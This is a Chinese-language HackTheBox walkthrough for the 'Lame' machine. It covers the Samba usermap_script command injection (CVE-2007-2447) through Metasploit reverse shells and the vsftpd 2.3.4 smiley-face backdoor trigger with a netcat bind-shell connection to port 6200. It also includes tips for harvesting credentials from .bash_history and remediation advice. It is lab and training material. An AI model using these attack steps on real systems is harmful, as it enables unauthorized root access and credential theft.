# HTB Machine: Lame

### 1. 📍 Reconnaissance（侦察与枚举）

* **核心端口/关键服务暴露**：
* `21/tcp`：FTP 服务 (vsftpd 2.3.4)，允许匿名登录。
* `22/tcp`：SSH 服务 (OpenSSH 4.7p1)。
* `139/tcp` & `445/tcp`：NetBIOS 与 SMB 服务 (Samba smbd 3.0.20-Debian)。


* **攻击面研判逻辑与实战避坑 (Rabbit Hole 识别)**：
* **诱饵特征**：`vsftpd 2.3.4` 是历史上极具标志性的“笑脸后门漏洞”。
* **破局逻辑**：实战中，当使用 MSF 的 `vsftpd_234_backdoor` 模块无任何会话反弹时，必须具备底层嗅觉——该利用链在防火墙或主机配置层已被阻断。严禁在此耗费时间，果断将主攻方向平移至 `139/445` 端口的 Samba 服务。



### 2. ⚔️ Initial Access（初始突破）

* **核心漏洞**：Samba 用户名映射脚本命令执行漏洞 (**CVE-2007-2447** / `usermap_script`)。
* **漏洞原理与底层机制 (Why)**：
* **缺乏输入清洗**：老旧的 Samba 服务在处理客户端登录的用户名输入时，完全没有进行严格的字符转义和危险符号过滤。
* **底层解析越权**：当服务端配置了 `username map script` 时，系统会把用户输入的账户名直接下发给底层的 `/bin/sh` 执行。攻击者只需在用户名处注入 Shell 元字符（如反引号 ``` 或 `$()`），即可打破原生语法树，迫使宿主机以 Samba 的高特权进程（默认为 `root`）执行任意恶意系统命令。


* **抓包分析与 Payload 构造逻辑 (根据截图排雷)**：
* **现象**：执行 exploit 后提示 `Exploit completed, but no session was created.`
* **避坑指南 1（网络协议层 - 端口硬绑定）**：截图中强行修改了 `set RPORT 445`。该特定 MSF 模块在建立 SMB 协议协商时，其底层代码硬编码依赖 `139` 端口进行 NetBIOS 会话初始化。强行指定 `445` 会导致握手阶段直接崩溃。必须保持 `RPORT` 为 `139`。
* **避坑指南 2（路由层 - 流量黑洞）**：截图中 `LHOST` 被设置为公网 IP (`148.113.59.186`)。靶机处于物理隔离的 VPN 内网中，根本没有公网出站路由。反向 Shell 的 TCP 握手包会直接被丢弃。必须 `set LHOST tun0`，强制将 Payload 的反连地址指向你的虚拟隧道内网 IP。



### 3. 🛡️ Privilege Escalation（权限提升）

* **本地信息收集与权限判定**：
* 此漏洞直接贯穿底层，成功反弹的会话即为 **`root` 最高权限**，跳过传统提权阶段。


* **后渗透环境重建 (Post-Exploitation OPSEC)**：
* **终端升级机制**：初始获得的为哑 Shell (Dumb Shell)，无交互能力且极易崩溃。必须优先利用目标机自带的解释器强制接管标准 TTY：
```bash
python -c 'import pty; pty.spawn("/bin/bash")'

```


* **严谨的战利品搜刮策略 (Situational Awareness)**：
* **摒弃应试思维**：严禁拿到 Shell 后无脑执行 `cat user.txt`。
* **标准操作流**：先执行 `pwd` 确认落脚点目录，再执行 `whoami` / `id` 确认身份。在触碰任何敏感文件前，必须使用 `ls -la` 查明当前目录的文件权限、隐藏文件（重点审计 `.bash_history` 提取明文凭证）以及创建时间戳，最后再安全读取 Flag。





### 4. 🛠️ Remediation（修复与防御）

* **底层架构缺陷**：危险的系统级 API 调用（`/bin/sh`）与外部不可信输入（用户名）发生了未隔离的直接交互。
* **根本性修复方案**：
1. **配置层阻断**：若无法立即停机更新，必须立即修改 `smb.conf` 文件，全面注释或移除 `username map script` 配置项，切断触发链。
2. **代码/版本层升级**：废弃 `Samba 3.0.20`。升级至官方修复版本。修复后的底层逻辑不再将未经过滤的输入传递给 Shell 解释器，而是采用安全的内部映射逻辑或强制实施严苛的正则表达式转义。

# HTB Machine: Lame - vsftpd 2.3.4 Backdoor Analysis

### 1. Vulnerability Mechanism（底层机制深挖）

* **核心漏洞**：**vsftpd 2.3.4 供应链污染后门 (Smiley Face Backdoor)**。
* **底层缺陷与触发逻辑**：2011 年，vsftpd 2.3.4 的官方源码压缩包遭黑客恶意篡改。恶意代码被隐蔽地植入在处理登录的底层函数中。当客户端发起 FTP 身份验证时，若输入的用户名中包含特定的“笑脸”字符序列 `:)`，将直接触发隐藏执行流。服务端会绕过常规密码校验，直接派生一个具备 **`root` 权限** 的交互式 Shell，并将其静默绑定在宿主机的 **6200 / TCP** 端口上。

### 2. Exploitation Route（实战利用路线）

1. **后门激活 (Payload Delivery)**：
* 使用 `netcat` 或任意 FTP 客户端连接至目标 `21/tcp` 端口。
* 输入包含触发器的恶意凭证强制激活后门：
```text
USER backdoor:)
PASS anypassword

```




2. **内部监听建立 (Bind Shell)**：
* 靶机底层解析到 `:)` 后，后门进程启动，在宿主机层面成功建立绑定 Shell。此时靶机内部状态更新，**6200 端口** 进入 `LISTEN` 状态。


3. **会话接入尝试**：
* 攻击者向目标的后门端口发起连接：`nc <Target_IP> 6200`。



### 3. Limitations & OPSEC（局限性与实战避坑）

* **漏洞局限性（防火墙阻断 / Firewall Blackhole）**：
* **内外视角割裂**：在 Lame 靶机中，后门代码**确实执行成功**，且 6200 端口也**确实在靶机内部开始监听**（即 Task 11 答案为 `yes`）。但攻击者最终无法获取 Shell，底层原因是靶机配置了严格的入站安全策略（**Firewall / 防火墙**）。
* **流量丢弃 (Packet Drop)**：防火墙仅放行了通过 `nmap` 探测到的几个常规服务端口。攻击者外部发往 `6200/tcp` 的 TCP 握手 SYN 包在系统网络边界被直接丢弃（Drop），导致连接超时。


* **实战避坑与 OPSEC 经验**：
* **不要轻信内部状态**：红队必须深刻理解，漏洞利用成功（代码执行） $\neq$ 拿到权限（网络可达）。在真实攻防中，绑定型后门（Bind Shell）极易被边界防火墙或云安全组拦截。
* **破除隧道视野 (Tunnel Vision)**：面对“Exploit 完成但无回显”的情况，不要反复发送 Payload，这只会增加防守方的流量告警日志。必须迅速转变思路，这是实战中极度经典的**兔子洞 (Rabbit Hole)** 陷阱，应当立刻放弃受阻路径，将渗透重心转移至其他存在安全验证缺陷的服务（如 Samba `usermap_script`）。
